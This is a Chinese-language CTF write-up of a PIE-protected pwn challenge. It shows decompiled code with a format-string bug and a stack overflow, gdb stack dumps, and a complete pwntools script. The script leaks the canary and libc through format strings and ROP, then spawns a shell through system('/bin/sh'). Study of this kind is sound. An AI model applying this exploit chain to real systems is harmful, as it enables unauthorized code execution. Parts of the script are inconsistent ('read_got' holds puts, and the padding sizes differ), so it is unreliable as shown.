## 这也是一道格式化字符串的题，rop，栈溢出

先说一下这道题目的调试，那道题目就开始调试了，发现竟然下不了断点！！！下不了断点可怎么调试啊？？</br>
于是做了以下工作：</br>
（1）刚开始以为是程序格式的问题，因为之前做的题目下载下来的文件格式都是exe可执行格式，这个文件是sharing file，但是可以运行，于是一顿谷歌，也没有找到解决
办法，这个办法无效。</br>
（2）问了同学，说是开了PIE保护的原因，发现ida里打开的程序文件，只有后三个字节的地址（偏移地址），也就是说程序的基地址是不知道的，只要我们找到程序的
基地址，再加上偏移地址就可以调试了。于是谷歌PIE调试下断点，给出了两种方法，一个是用pwndgb调试，b *$rebase(0x相对基址偏移)，如 b *$rebase(0x100)
即可，第二种办法是用命令 ps -aux|grep task_shoppingCart找到该程序的pie，然后根据上一条指令的结果，会有一个pie ID，如6158，进入到该文件下，
/proc/6158/map_files$ ls ，就可以查看程序的基址。但是！！但是！！！两种办法对于这个题目来说都不行！！！</br>
（3）于是有了第三种办法：直接调试 gdb pwn，然后 r ,直接 ctrl + c ,然后输入vmmap就能看到基址！！！</br>

__终于可以调试啦！__

## 做题思路

```c
unsigned __int64 sub_91C()
{
  char buf; // [rsp+7h] [rbp-4E9h]
  ssize_t v2; // [rsp+8h] [rbp-4E8h]
  char s; // [rsp+10h] [rbp-4E0h]
  char v4; // [rsp+D7h] [rbp-419h]
  char v5; // [rsp+E0h] [rbp-410h]
  unsigned __int64 v6; // [rsp+4E8h] [rbp-8h]

  v6 = __readfsqword(0x28u); //canary
  while ( 1 )
  {
    sub_8FD();
    v2 = read(0, &buf, 1uLL);  //读入一个字节（1，2，or 3）
    if ( v2 != 1 )
      break;
    if ( buf == 49 ) //读入的是1
    {
      read(0, &v5, 0x5DCuLL);  //栈溢出
    }
    else
    {
      if ( buf != 50 ) //读入的不是2
        return __readfsqword(0x28u) ^ v6; //出错
      read(0, &s, 0xC8uLL); //读
      v4 = 0;
      if ( strchr(&s, 110) ) //如果S中有/n，就输出nope
      {
        puts("nope");
      }
      else
      {
        printf("Is that it \"", 110LL);
        printf(&s);  //格式化字符串漏洞
        puts("\"?");
      }
    }
  }
  return __readfsqword(0x28u) ^ v6;
}
```

这道题目保护全开，上边已经提到了，开启PIE就不能正常调试，得知道程序基址，然后这道题目还涉及canary和格式化字符串漏洞，很容易想到，用格式化字符串去泄漏canary，以及我们要用的函数地址。
思路：用格式化字符串泄漏canary和read地址，得到libc版本，从而得到system（‘/bin/sh’）地址。

---
调试：
输入
2AAAAAAAA,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx
输出
AAAAAAAA,7fffffffb1d0,7ffff7dd3780,7ffff7b042c0,7ffff7fda700,c,32007ffff7fdb000,1,4141414141414141,786c252c786c252c,786c252c786c252c,786c252c786c252c,786c252c786c252c,786c252c786c252c,786c252c786c252c
查看栈中的内容：
--More--(150/200)
1200| 0x7fffffffdd10 --> 0x19 
1208| 0x7fffffffdd18 --> 0x7ffff7dd2620 --> 0xfbad2887 
1216| 0x7fffffffdd20 --> 0x555555554b44 ("<insert something clever>")
1224| 0x7fffffffdd28 --> 0x7ffff7a7c7fa (<_IO_puts+362>:	cmp    eax,0xffffffff)
1232| 0x7fffffffdd30 --> 0x0 
1240| 0x7fffffffdd38 --> 0x7fffffffdd50 --> 0x7fffffffdd70 --> 0x555555554ac0 (push   r15)
1248| 0x7fffffffdd40 --> 0x5555555547e0 (xor    ebp,ebp)
1256| 0x7fffffffdd48 --> 0xc8d1cdd933276500 
1264| 0x7fffffffdd50 --> 0x7fffffffdd70 --> 0x555555554ac0 (push   r15)
1272| 0x7fffffffdd58 --> 0x555555554aac (mov    eax,0x0)
1280| 0x7fffffffdd60 --> 0x7fffffffde58 --> 0x7fffffffe20a ("/home/hdd/oj/pwni/pwnio")
1288| 0x7fffffffdd68 --> 0x100000000
可以看到在158处就是canary的位置。但是相对于格式化字符串的参数，他在163的位置，因为AAAAAAAA是在栈中第八个显示的，显示在第三的位置，相差5，所以canary的位置=158+5=163.


## 脚本

```python
from pwn import *
from LibcSearcher import LibcSearcher
r= remote("vps1.blue-whale.me" ,19908)
elf=ELF('./pwnio')
#leak canary
r.recvuntil("1, 2, or 3\n")
payload = "2AAAAAAAA%163$p"
r.sendline(payload)
r.recvuntil("AAAAAAAA")
canary=int(r.recvuntil('\n'),16)
print hex(canary)

#leak elf_base
r.recvuntil("1, 2, or 3\n")
payload="2AAAAAAAA%165$p"
r.send(payload)
r.recvuntil("AAAAAAAA")
elf_base=int(r.recvuntil('\n'),16)&0xfffffffffffff000
print hex(elf_base)

#leak read_addr
pop_rdi=elf_base+0xb23
ret_addr=elf_base+0x91C
puts_plt=elf.plt['puts']
read_got=elf.got['puts']
payload='A'*0x408+p64(canary)+'B'*8
payload+=p64(pop_rdi)+p64(read_got)
payload+=p64(puts_plt)
payload+=p64(ret_addr)

r.sendline("1")
r.sendline(payload)
r.sendline("3")
read_addr=u64(r.recvuntil("\n",drop=True).ljust(8,'\x00'))
log.success('read_addr : ' + hex(read_addr))
#read_addr=0x7f1be43c29c0

#leak system_addr and binsh_addr
libc=LibcSearcher('read',read_addr)
libc_base=read_addr-libc.dump('read')
system_addr=libc_base+libc.dump('system')
binsh_addr=libc_base+libc.dump('str_bin_sh')

payload="1"+'A'*408+p64(canary)+"B"*8+p64(system_addr)+p64(ret_addr)+p64(binsh_addr)
r.sendline(payload)
r.sendline('3')
r.sendline("cat flag")
r.interactive()

```

